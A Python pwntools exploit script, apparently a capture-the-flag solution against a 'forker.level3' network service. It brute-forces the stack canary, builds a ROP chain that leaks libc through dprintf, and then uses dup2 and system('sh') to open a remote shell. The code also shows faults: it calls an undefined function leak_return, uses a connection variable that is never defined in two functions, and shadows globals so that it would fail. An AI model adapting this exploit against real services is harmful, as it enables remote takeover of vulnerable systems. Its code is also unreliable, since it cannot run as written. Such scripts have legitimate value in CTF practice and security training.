from pwn import *

e = context.binary = ELF('./forker.level3')

debug = 1

if debug == 1:
	libc = ELF('./reverse_libc')
else:
	libc = ELF('./libc-2.26.so')
      
pop_rdi_ret 	= 0x000c93
pop_rsi_r15_ret = 0x000c91

puts_offset    = libc.symbols['puts']
dprintf_offset = libc.symbols['dprintf']
sys_offset     = libc.symbols['system']
exit_offset    = libc.symbols['exit']
sh_offset      = libc.search('sh\x00').next()

libc_base = 0x00



canary = []
ret    = ['\xf1']



def leak_canary():

	global canary
	global ret
	global libc_base

	for j in range (0, 8):
		for i in range (0, 256):
			print i
			if i == 10:
				continue

			if debug == 1:
				r = remote('192.168.226.129', 31337)
			else:
				r = remote('forker3.wpictf.xyz', 31337)

			r.recvuntil("Password:")

			hex_byte = chr(i)
			leak  = 'A'*(72)
			leak += ''.join([k for k in canary])
			leak += hex_byte
			print size(leak)

			r.sendline(leak)
			try:
				print r.recv()
				
			except Exception:
				r.close()
				continue 
			r.close()
			canary.append(hex_byte)
			print canary
			break

	print canary


def leak_libc():

	global canary
	global ret
	global libc_base

	canary = ''.join([i for i in canary])
	ret    = ''.join([j for j in ret])

	binary_base =  u64(ret) - 0x9f1

	pop_rdi_ret 	= binary_base + pop_rdi_ret
	pop_rsi_r15_ret = binary_base + pop_rsi_r15_ret

	leak  = 'A'*(72)
	leak += canary

	leak += 'A'*(40-8*3)
	leak += p64(4)
	leak += 'A'*(8*2)


	leak += p64(pop_rdi_ret)
	leak += p64(0x04)
	leak += p64(pop_rsi_r15_ret)
	leak += p64(e.got.puts + binary_base)     # argument
	leak += p64(0x00)     		# argument
	leak += p64(e.plt.dprintf + binary_base)     # function_call
	#leak += p64(0x7e89000 + dprintf_offset)     # function_call
	leak += p64(e.plt.exit + binary_base)    # pop rdi; ret



	r.recvuntil("Password:")

	raw_input('go')

	r.sendline(leak)


	puts  = u64(r.recv(6).strip().ljust(8, "\x00"))

	log.success('puts() at %#x', puts)

	libc_base = puts - puts_offset

	log.success('libc_base located at %#x', libc_base)



def exploit():

	system = libc_base + sys_offset
	sh = libc_base + sh_offset
	exit = libc_base + exit_offset


	canary = ''.join([i for i in canary])
	ret    = ''.join([j for j in ret])

	binary_base =  u64(ret) - 0x9f1

	pop_rdi_ret 	= binary_base + pop_rdi_ret
	pop_rsi_r15_ret = binary_base + pop_rsi_r15_ret


	dup2_address = libc_base + libc.symbols['dup2']


	leak  = 'A'*(72)
	leak += canary

	leak += 'A'*(40-8*3)
	leak += p64(4)
	leak += 'A'*(8*2)


	leak += p64(pop_rdi_ret)
	leak += p64(4)
	leak += p64(pop_rsi_r15_ret)
	leak += p64(0)
	leak += p64(0x00)
	leak += p64(dup2_address)

	leak += p64(pop_rdi_ret)
	leak += p64(4)
	leak += p64(pop_rsi_r15_ret)
	leak += p64(1)
	leak += p64(0x00)
	leak += p64(dup2_address)

	leak += p64(pop_rdi_ret)
	leak += p64(4)
	leak += p64(pop_rsi_r15_ret)
	leak += p64(2)
	leak += p64(0x00)
	leak += p64(dup2_address)

	leak += p64(pop_rdi_ret) # pop rdi; ret
	leak += p64(sh)          # argument
	leak += p64(system)      # function_call


	r.recvuntil("Password:")

	r.sendline(leak)

	r.interactive()




leak_canary()
leak_return()
leak_libc()
exploit()